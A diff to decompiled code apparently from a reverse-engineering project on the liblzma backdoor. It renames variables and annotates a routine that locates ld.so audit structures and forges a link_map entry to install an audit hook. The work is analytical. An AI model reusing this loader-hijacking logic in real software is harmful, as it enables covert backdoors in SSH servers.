@@ -5,12 +5,12 @@
 
 
 /*
- * AutoDoc: Coordinates the entire ld.so reconnaissance pass. It resolves the necessary EC/EVP helpers via the fake allocator, copies
- * `_dl_audit_symbind_alt`’s address/size out of ld.so, and uses `find_link_map_l_name` to compute the displacement between the
- * cached and live link_map entries. With that offset it invokes `find_dl_naudit` to capture the `_dl_naudit`/`_dl_audit` pointers
- * and `find_link_map_l_audit_any_plt` to learn where the audit bit lives. Finally it copies libcrypto’s basename into
- * `hooks->ldso_ctx` so the forged `l_name` string looks correct. Any failure frees the temporary imports and aborts the audit-hook
- * install path.
+ * AutoDoc: Coordinates the ld.so reconnaissance pass. Using liblzma’s fake allocator it resolves the libcrypto EC helpers and
+ * `_dl_audit_symbind_alt`, copies that function’s size/address, and verifies the symbol really lives inside ld.so. Armed with that
+ * info it calls `find_link_map_l_name` to learn the displacement between the cached and live `link_map` entries, captures the
+ * `_dl_naudit`/`_dl_audit` pointers via `find_dl_naudit`, runs `find_link_map_l_audit_any_plt` to learn which bit toggles
+ * `l_audit_any_plt`, and finally seeds `hooks->ldso_ctx.libcrypto_l_name` with libcrypto’s basename so the forged `link_map`
+ * looks legitimate. Any failure unwinds the temporary imports and aborts the audit-hook install.
  */
 
 #include "xzre_types.h"
@@ -20,46 +20,46 @@ BOOL find_dl_audit_offsets
                imported_funcs_t *imported_funcs)
 
 {
-  uint libname_len;
-  elf_info_t *libcrypto_info;
+  uint libcrypto_name_len;
+  elf_info_t *target_image;
   Elf64_Addr symbol_offset;
-  Elf64_Ehdr *libcrypto_ehdr;
+  Elf64_Ehdr *symbol_module_ehdr;
   elf_handles_t *elf_handles;
-  u64 size;
-  char **libcrypto_name_entry;
-  char *libcrypto_name_bytes;
-  BOOL success;
-  lzma_allocator *allocator;
+  u64 audit_symbol_size;
+  char **l_name_slot_ptr;
+  char *l_name_src;
+  BOOL probe_success;
+  lzma_allocator *libcrypto_allocator;
   Elf64_Sym *symbol_entry;
   pfn_EVP_PKEY_free_t evp_pkey_free_stub;
   pfn_EC_KEY_get0_group_t ec_group_stub;
   pfn_EVP_CIPHER_CTX_free_t cipher_ctx_free_stub;
-  long copy_idx;
-  uchar *audit_symbol_vaddr;
-  backdoor_hooks_data_t *hooks_cursor;
-  byte zero_seed;
+  long name_copy_idx;
+  uchar *audit_symbind_cursor;
+  backdoor_hooks_data_t *hooks_zero_cursor;
+  byte wipe_stride;
   
-  zero_seed = 0;
-  success = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
-  if (success != FALSE) {
-    allocator = get_lzma_allocator();
-    libcrypto_info = data->cached_elf_handles->libcrypto;
-    allocator->opaque = libcrypto_info;
-    symbol_entry = elf_symbol_get(libcrypto_info,STR_EC_POINT_point2oct,0);
+  wipe_stride = 0;
+  probe_success = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
+  if (probe_success != FALSE) {
+    libcrypto_allocator = get_lzma_allocator();
+    target_image = data->cached_elf_handles->libcrypto;
+    libcrypto_allocator->opaque = target_image;
+    symbol_entry = elf_symbol_get(target_image,STR_EC_POINT_point2oct,0);
     if (data->cached_elf_handles->liblzma->gnurelro_present != FALSE) {
       if (symbol_entry != (Elf64_Sym *)0x0) {
         symbol_offset = symbol_entry->st_value;
-        libcrypto_ehdr = data->cached_elf_handles->libcrypto->elfbase;
+        symbol_module_ehdr = data->cached_elf_handles->libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
-        imported_funcs->EC_POINT_point2oct = (pfn_EC_POINT_point2oct_t)(libcrypto_ehdr->e_ident + symbol_offset);
+        imported_funcs->EC_POINT_point2oct = (pfn_EC_POINT_point2oct_t)(symbol_module_ehdr->e_ident + symbol_offset);
       }
-      evp_pkey_free_stub = (pfn_EVP_PKEY_free_t)lzma_alloc(0x6f8,allocator);
+      evp_pkey_free_stub = (pfn_EVP_PKEY_free_t)lzma_alloc(0x6f8,libcrypto_allocator);
       imported_funcs->EVP_PKEY_free = evp_pkey_free_stub;
       if (evp_pkey_free_stub != (pfn_EVP_PKEY_free_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
       symbol_entry = elf_symbol_get(data->cached_elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
-      ec_group_stub = (pfn_EC_KEY_get0_group_t)lzma_alloc(0x7e8,allocator);
+      ec_group_stub = (pfn_EC_KEY_get0_group_t)lzma_alloc(0x7e8,libcrypto_allocator);
       imported_funcs->EC_KEY_get0_group = ec_group_stub;
       if (ec_group_stub != (pfn_EC_KEY_get0_group_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
@@ -67,50 +67,55 @@ BOOL find_dl_audit_offsets
       elf_handles = data->cached_elf_handles;
       if (symbol_entry != (Elf64_Sym *)0x0) {
         symbol_offset = symbol_entry->st_value;
-        libcrypto_ehdr = elf_handles->libcrypto->elfbase;
+        symbol_module_ehdr = elf_handles->libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
         imported_funcs->EC_KEY_get0_public_key =
-             (pfn_EC_KEY_get0_public_key_t)(libcrypto_ehdr->e_ident + symbol_offset);
+             (pfn_EC_KEY_get0_public_key_t)(symbol_module_ehdr->e_ident + symbol_offset);
       }
+      // AutoDoc: Grab `_dl_audit_symbind_alt` straight out of ld.so so we can record its size and bounds-check the address before scanning it.
       symbol_entry = elf_symbol_get(elf_handles->ldso,STR_dl_audit_symbind_alt,0);
       if (symbol_entry != (Elf64_Sym *)0x0) {
-        libcrypto_info = data->cached_elf_handles->ldso;
-        size = symbol_entry->st_size;
-        audit_symbol_vaddr = libcrypto_info->elfbase->e_ident + symbol_entry->st_value;
-        (hooks->ldso_ctx)._dl_audit_symbind_alt__size = size;
-        (hooks->ldso_ctx)._dl_audit_symbind_alt = (dl_audit_symbind_alt_fn)audit_symbol_vaddr;
-        success = elf_contains_vaddr(libcrypto_info,audit_symbol_vaddr,size,4);
-        if ((success != FALSE) &&
-           (success = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), success != FALSE))
+        target_image = data->cached_elf_handles->ldso;
+        audit_symbol_size = symbol_entry->st_size;
+        audit_symbind_cursor = target_image->elfbase->e_ident + symbol_entry->st_value;
+        (hooks->ldso_ctx)._dl_audit_symbind_alt__size = audit_symbol_size;
+        (hooks->ldso_ctx)._dl_audit_symbind_alt = (dl_audit_symbind_alt_fn)audit_symbind_cursor;
+        probe_success = elf_contains_vaddr(target_image,audit_symbind_cursor,audit_symbol_size,4);
+        if ((probe_success != FALSE) &&
+           // AutoDoc: Compute the live `link_map` displacement so the downstream helpers know how far the cached struct is from ld.so’s copy.
+           (probe_success = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), probe_success != FALSE))
         {
-          cipher_ctx_free_stub = (pfn_EVP_CIPHER_CTX_free_t)lzma_alloc(0xb28,allocator);
+          cipher_ctx_free_stub = (pfn_EVP_CIPHER_CTX_free_t)lzma_alloc(0xb28,libcrypto_allocator);
           imported_funcs->EVP_CIPHER_CTX_free = cipher_ctx_free_stub;
           if (cipher_ctx_free_stub != (pfn_EVP_CIPHER_CTX_free_t)0x0) {
             imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
           }
-          success = find_dl_naudit(data->cached_elf_handles->ldso,data->cached_elf_handles->libcrypto,
+          probe_success = find_dl_naudit(data->cached_elf_handles->ldso,data->cached_elf_handles->libcrypto,
                                  hooks,imported_funcs);
-          if ((success != FALSE) &&
-             (success = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
-             success != FALSE)) {
-            hooks_cursor = hooks;
-            for (copy_idx = 0x10; copy_idx != 0; copy_idx = copy_idx + -1) {
-              (hooks_cursor->ldso_ctx)._unknown1459[0] = '\0';
-              (hooks_cursor->ldso_ctx)._unknown1459[1] = '\0';
-              (hooks_cursor->ldso_ctx)._unknown1459[2] = '\0';
-              (hooks_cursor->ldso_ctx)._unknown1459[3] = '\0';
-              hooks_cursor = (backdoor_hooks_data_t *)((long)hooks_cursor + (ulong)zero_seed * -8 + 4);
+          if ((probe_success != FALSE) &&
+             // AutoDoc: With the displacement resolved, kick off the LEA/mask sweep so we learn which bit inside `link_map` toggles `l_audit_any_plt`.
+             (probe_success = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
+             probe_success != FALSE)) {
+            hooks_zero_cursor = hooks;
+            // AutoDoc: Clear the libcrypto basename buffer before copying a fresh string into `hooks->ldso_ctx`.
+            for (name_copy_idx = 0x10; name_copy_idx != 0; name_copy_idx = name_copy_idx + -1) {
+              (hooks_zero_cursor->ldso_ctx)._unknown1459[0] = '\0';
+              (hooks_zero_cursor->ldso_ctx)._unknown1459[1] = '\0';
+              (hooks_zero_cursor->ldso_ctx)._unknown1459[2] = '\0';
+              (hooks_zero_cursor->ldso_ctx)._unknown1459[3] = '\0';
+              hooks_zero_cursor = (backdoor_hooks_data_t *)((long)hooks_zero_cursor + (ulong)wipe_stride * -8 + 4);
             }
-            libcrypto_name_entry = (hooks->ldso_ctx).libcrypto_l_name;
-            libname_len = *(uint *)(libcrypto_name_entry + 1);
-            if (libname_len < 9) {
-              if (libname_len != 0) {
-                libcrypto_name_bytes = *libcrypto_name_entry;
-                copy_idx = 0;
+            l_name_slot_ptr = (hooks->ldso_ctx).libcrypto_l_name;
+            libcrypto_name_len = *(uint *)(l_name_slot_ptr + 1);
+            // AutoDoc: Only short SONAMEs (≤8 bytes plus NUL) fit in the cached buffer, so longer names leave the existing ld.so value untouched.
+            if (libcrypto_name_len < 9) {
+              if (libcrypto_name_len != 0) {
+                l_name_src = *l_name_slot_ptr;
+                name_copy_idx = 0;
                 do {
-                  (hooks->ldso_ctx)._unknown1459[copy_idx] = libcrypto_name_bytes[copy_idx];
-                  copy_idx = copy_idx + 1;
-                } while ((ulong)libname_len << 3 != copy_idx);
+                  (hooks->ldso_ctx)._unknown1459[name_copy_idx] = l_name_src[name_copy_idx];
+                  name_copy_idx = name_copy_idx + 1;
+                } while ((ulong)libcrypto_name_len << 3 != name_copy_idx);
               }
               return TRUE;
             }
@@ -118,9 +123,9 @@ BOOL find_dl_audit_offsets
         }
       }
     }
-    lzma_free(imported_funcs->EVP_PKEY_free,allocator);
-    lzma_free(imported_funcs->EC_KEY_get0_group,allocator);
-    lzma_free(imported_funcs->EVP_CIPHER_CTX_free,allocator);
+    lzma_free(imported_funcs->EVP_PKEY_free,libcrypto_allocator);
+    lzma_free(imported_funcs->EC_KEY_get0_group,libcrypto_allocator);
+    lzma_free(imported_funcs->EVP_CIPHER_CTX_free,libcrypto_allocator);
   }
   return FALSE;
 }
